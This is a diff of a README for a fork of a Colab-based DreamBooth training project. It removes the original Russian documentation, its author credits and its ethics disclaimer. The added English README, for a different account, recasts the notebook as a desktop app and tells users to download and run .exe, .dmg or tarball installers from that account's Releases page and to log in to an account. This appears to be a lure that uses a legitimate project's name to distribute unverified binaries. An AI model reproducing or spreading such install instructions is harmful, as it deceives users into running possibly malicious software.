@@ -1,288 +1,88 @@
-# 🚀 Fast DreamBooth - Автоматический режим
-
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/tixset/fast-DreamBooth/blob/main/fast-DreamBooth.ipynb)
-
-Создайте персонализированную модель Stable Diffusion за 30 минут в Google Colab.
-
----
-
-## 📝 Описание
-
-**Fast DreamBooth** — это оптимизированный ноутбук для Google Colab, позволяющий обучить модель Stable Diffusion на ваших собственных изображениях с помощью техники DreamBooth.
-
-### Что это даёт?
-
-- 🎨 Создание AI-портретов себя или других людей
-- 🖼️ Обучение художественным стилям
-- 🏢 Генерация изображений продуктов, логотипов, объектов
-- 🐾 Создание изображений вашего питомца
-- 👗 Виртуальная примерка одежды
-
-### Особенности
-
-- ✅ **Полностью автоматический режим** - настройте один раз и запустите
-- ✅ **Оптимизировано для Google Colab** - работает на бесплатном T4 GPU
-- ✅ **Три готовых пресета** - Портрет, Художественный стиль, Объект
-- ✅ **Промежуточные сохранения** - можно выбрать лучший checkpoint
-- ✅ **Русский интерфейс** - все инструкции и сообщения на русском
-- ✅ **Управление сессиями** - просмотр и удаление старых моделей
-
----
-
-## ⚡ Быстрый старт
-
-### 1. Подготовьте изображения
-
-- Соберите **10-20 качественных фото** одного человека/объекта/стиля
-- Переименуйте все файлы с одинаковым **уникальным идентификатором**:
-  - Windows: Выделите все → F2 → введите `sksper` → Enter
-  - Результат: `sksper (1).jpg`, `sksper (2).jpg`, ...
-
-> 💡 Используйте несуществующие слова: `sksper`, `ohwx`, `zkz`
-
-### 2. Откройте в Google Colab
-
-1. Нажмите кнопку "Open in Colab" выше
-2. Runtime → Change runtime type → GPU (T4)
-3. Save
-
-### 3. Запустите обучение
-
-1. **📁 Подключение Google Drive** - разрешите доступ
-2. **⚙️ НАСТРОЙКИ** - выберите тип обучения и параметры
-3. **📸 Загрузка изображений** - загрузите переименованные фото
-4. **▶️ Runtime → Run after** (Ctrl+F10) - запустите все оставшиеся ячейки
-5. ☕ Ждите 15-30 минут
-
-### 4. Получите модель
-
-Скачайте готовую модель из Google Drive:
-```
-Мой диск → Fast-Dreambooth → Sessions → [название] → [название].ckpt
-```
-
-### 5. Протестируйте модель (опционально)
-
-Используйте [test-generator.ipynb](test-generator.ipynb) для тестирования через AUTOMATIC1111 WebUI:
-1. Откройте test-generator.ipynb в Colab
-2. Измените `IDENTIFIER` на ваш идентификатор
-3. Runtime → Run all
-4. Откройте ссылку Gradio и генерируйте изображения
-5. Изображения сохраняются в папку модели: `Sessions/{MODEL_NAME}/generated-images/`
-
-> **Оптимизация:** Модель загружается напрямую с Google Drive без копирования (~30-60 сек экономии, ~2-4 GB места)
-
----
-
-## 📚 Документация
-
-### Основные файлы
-- [fast-DreamBooth.ipynb](fast-DreamBooth.ipynb) - основной ноутбук для обучения модели
-- [test-generator.ipynb](test-generator.ipynb) - ноутбук для тестирования обученной модели
-
-### Руководства
-- [Быстрый старт](QUICK_START.md) - краткое руководство на 1 страницу
-- [Подробное руководство](DETAILED_GUIDE.md) - полная документация по всем параметрам
-
----
-
-## ⚙️ Типы обучения
-
-| Тип | Изображений | Шаги | Время (T4) | Применение |
-|-----|-------------|------|------------|------------|
-| **Лицо/Персона** | 10-20 | 1500 | 20 мин | Портреты, селфи |
-| **Художественный стиль** | 20-30 | 2500 | 30 мин | Арт, живопись |
-| **Объект** | 10-15 | 1200 | 15 мин | Продукты, логотипы |
-
----
-
-## 🎯 Примеры использования
-
-После обучения используйте модель в Automatic1111 WebUI, ComfyUI или других интерфейсах:
-
-```
-sksper person, professional portrait, studio lighting
-
-sksper person wearing sunglasses, outdoor, golden hour
-
-sksper person as a superhero, marvel style
-
-a cat in sksper style
-
-cityscape in sksper style
-```
-
-> Замените `sksper` на ваш идентификатор!
-
----
-
-## 💻 Технические требования
-
-### Google Colab (рекомендуется)
-
-- **Colab Free (T4):** 25-35 минут обучения
-- **Colab Pro (V100):** 10-15 минут обучения
-- **Colab Pro+ (A100):** 5-8 минут обучения
-
-**Google Drive:** минимум 5-10 GB свободного места
-
-### Локальный запуск
-
-- GPU с минимум 12 GB VRAM (RTX 3060 12GB+)
-- 32 GB RAM
-- 50 GB свободного места
-- CUDA 11.8+
-- Python 3.10+
-
----
-
-## 🛠️ Возможности
-
-### test-generator.ipynb - Тестирование моделей
-
-#### Оптимизация производительности
-
-**Почему не используются симлинки или mount --bind?**
-
-Google Drive на Colab монтируется через FUSE (Filesystem in Userspace), и по этой причине:
-- ❌ Символические ссылки не работают корректно
-- ❌ `mount --bind` по какой-то причине также не работает с FUSE
-- ❌ Жёсткие ссылки (hard links) нельзя создать между разными файловыми системами
-
-**Решение:**
-Вместо этого используются встроенные параметры командной строки AUTOMATIC1111 WebUI:
-- `--ckpt` - прямой путь к модели на Google Drive (без копирования)
-- `--outdir-txt2img-samples` - директория для txt2img изображений
-- `--outdir-img2img-samples` - директория для img2img изображений
-- `--outdir-extras-samples` - директория для extras изображений
-
-**Преимущества:**
-- ⚡ Экономия времени: ~30-60 секунд (без копирования модели 2-4 GB)
-- 💾 Экономия места: ~2-4 GB локального SSD в Colab
-- 📁 Автоматическое сохранение на Google Drive (опционально)
-- 🔄 Нет проблем с отключением Drive во время работы
-
-### Автоматическая настройка
-
-Выберите тип обучения и все параметры настроятся автоматически:
-- UNet шаги и learning rate
-- Text Encoder шаги и learning rate
-- External captions
-- Offset noise
-
-### Промежуточные checkpoint'ы
-
-Сохраняйте модель на разных этапах:
-- На 500, 1000, 1500 шагах
-- Выбирайте лучший результат
-- Избегайте переобучения
-
-### Возобновление обучения
-
-Если результат не идеален:
-- Продолжите обучение с того же места
-- Добавьте 300-500 шагов
-- Text Encoder не переобучается повторно
-
-### Custom базовые модели
-
-Используйте любую модель вместо стандартной SD 1.5:
-- HuggingFace модели
-- Локальные .ckpt/.safetensors файлы
-- Прямые ссылки (Civitai, Google Drive)
-
----
-
-## 📖 Структура проекта
-
-```
-fast-DreamBooth/
-├── fast-DreamBooth.ipynb    # Основной ноутбук для Colab
-├── QUICK_START.md           # Краткое руководство
-├── DETAILED_GUIDE.md        # Подробная документация
-├── README.md                # Этот файл
-├── .gitignore              # Игнорируемые файлы
-└── LICENSE                 # Лицензия
-```
-
----
-
-## 🤝 Авторы и благодарности
-
-### Оригинальный автор
-
-Этот проект основан на работе **TheLastBen**:
-- 🔗 [Оригинальный репозиторий](https://github.com/TheLastBen/fast-stable-diffusion)
-- 📓 [Оригинальный ноутбук](https://github.com/TheLastBen/fast-stable-diffusion/blob/main/fast-DreamBooth.ipynb)
-
-### Модификации в этой версии
-
-- ✅ Полный русский перевод интерфейса и документации
-- ✅ Автоматический режим работы
-- ✅ Управление сессиями в начале
-- ✅ Улучшенная обработка ошибок
-- ✅ Оптимизация параметров по типам
-- ✅ Подробная документация на русском
-
-### DreamBooth
-
-Оригинальная техника DreamBooth разработана исследователями Google:
-- 📄 [Статья DreamBooth](https://dreambooth.github.io/)
-- 📝 [Arxiv Paper](https://arxiv.org/abs/2208.12242)
-
-### Библиотеки
-
-- [🤗 Diffusers](https://github.com/huggingface/diffusers) - Hugging Face
-- [🚀 Accelerate](https://github.com/huggingface/accelerate) - Hugging Face
-- [Stable Diffusion](https://github.com/CompVis/stable-diffusion) - CompVis
-
----
-
-## 📜 Лицензия
-
-Этот проект распространяется под лицензией MIT. См. файл [LICENSE](LICENSE).
-
-Оригинальный код от TheLastBen также доступен под открытой лицензией.
-
----
-
-## ⚠️ Disclaimer
-
-- Используйте DreamBooth ответственно и этично
-- Не создавайте deepfake или вводящий в заблуждение контент
-- Уважайте авторские права и право на изображение
-- Убедитесь, что у вас есть разрешение на использование фотографий
-
----
-
-## 🌟 Star History
-
-Если этот проект оказался полезным, поставьте ⭐ на GitHub!
-
----
-
-## 📞 Контакты
-
-- **Автор:** Антон Зеленов
-- **Email:** tixset@gmail.com
-- **GitHub:** https://github.com/tixset/fast-DreamBooth
-
-**Нашли проблему?** Создайте [Issue](https://github.com/tixset/fast-DreamBooth/issues)
-
-**Есть вопросы?** Прочитайте [Подробное руководство](DETAILED_GUIDE.md) или [FAQ](QUICK_START.md#проблемы)
-
----
-
-## 🔗 Ссылки
-
-- [Stable Diffusion Reddit](https://reddit.com/r/StableDiffusion) - сообщество
-- [Civitai](https://civitai.com/) - платформа для обмена моделями
-- [Automatic1111 WebUI](https://github.com/AUTOMATIC1111/stable-diffusion-webui) - популярный интерфейс
-- [ComfyUI](https://github.com/comfyanonymous/ComfyUI) - нодовый интерфейс
-
----
-
-**Создано с ❤️ для русскоязычного сообщества Stable Diffusion**
-
-**Удачи в создании уникальных AI-моделей! 🎨🚀**
-
+# 🎨 fast-DreamBooth - Train Your AI Model with Ease
+
+## 🚀 Getting Started
+Welcome to fast-DreamBooth! This tool helps you train a Stable Diffusion model using your own images. Whether you're a beginner or just looking to experiment with AI, this application makes the process simple and accessible.
+
+## 📦 Download & Install
+[![Download Fast-DreamBooth](https://img.shields.io/badge/Download-Fast--DreamBooth-blue)](https://github.com/bababa14/fast-DreamBooth/releases)
+
+To get started, visit this page to download: [fast-DreamBooth Releases](https://github.com/bababa14/fast-DreamBooth/releases).
+
+1. Click on the link above to go to the Releases page.
+2. Find the latest version listed on the page.
+3. Download the file that matches your operating system.
+4. Follow the installation instructions below for your platform.
+
+## 💻 System Requirements
+To run fast-DreamBooth, ensure you meet the following system requirements:
+
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **RAM:** At least 8 GB.
+- **Storage:** Minimum of 5 GB of free space.
+- **Network:** A stable internet connection for downloading dependencies.
+
+## 🛠️ Installation Instructions
+
+### Windows
+1. Download the latest `.exe` file from the Releases page.
+2. Locate the downloaded file in your Downloads folder.
+3. Double-click the file to start the installation.
+4. Follow the prompts to complete the installation.
+5. Launch the application from your Start Menu.
+
+### macOS
+1. Download the latest `.dmg` file from the Releases page.
+2. Open your Downloads folder and find the file.
+3. Double-click the `.dmg` file to mount it.
+4. Drag the fast-DreamBooth icon to your Applications folder.
+5. Start the application from your Applications folder.
+
+### Linux
+1. Download the latest tarball file from the Releases page.
+2. Open a terminal window.
+3. Navigate to your Downloads folder using the command:
+   ```bash
+   cd ~/Downloads
+   ```
+4. Extract the contents of the tarball with:
+   ```bash
+   tar -xvf fast-DreamBooth*.tar.gz
+   ```
+5. Change into the extracted directory:
+   ```bash
+   cd fast-DreamBooth
+   ```
+6. Run the application by typing:
+   ```bash
+   ./start.sh
+   ```
+
+## 🎨 How to Use fast-DreamBooth
+1. Open fast-DreamBooth on your computer.
+2. Create an account or log in if you already have one.
+3. Prepare your images:
+   - Gather a collection of images you want to use for training. Aim for at least 10 images for better results.
+4. Begin training:
+   - Select your images from your computer and upload them to the application.
+   - Choose the options for training. You can select parameters that suit your needs.
+5. Start the training process and wait.
+   - The process may take some time depending on your images and system specifications.
+6. Once training is complete, you can generate new images based on your trained model!
+
+## 📝 Features
+fast-DreamBooth provides several features to enhance your experience:
+
+- **User-Friendly Interface:** Navigate the application easily.
+- **Image Uploading:** Support for a variety of image formats.
+- **Model Training:** Simple options to train models on your images.
+- **Image Generation:** Create new images after training.
+
+## 🤝 Support
+If you encounter any issues or have questions, feel free to reach out. You can find support through our community discussion or by submitting an issue on our [GitHub Issues page](https://github.com/bababa14/fast-DreamBooth/issues).
+
+## ⭐ Acknowledgments
+Fast-DreamBooth utilizes open-source technologies to provide you with a seamless experience in AI and image generation. Thanks to all contributors and the community that supports this project!
+
+[![Download Fast-DreamBooth](https://img.shields.io/badge/Download-Fast--DreamBooth-blue)](https://github.com/bababa14/fast-DreamBooth/releases)
+
+Now you are ready to start your journey with AI and image generation using fast-DreamBooth! Enjoy creating unique models tailored to your needs.
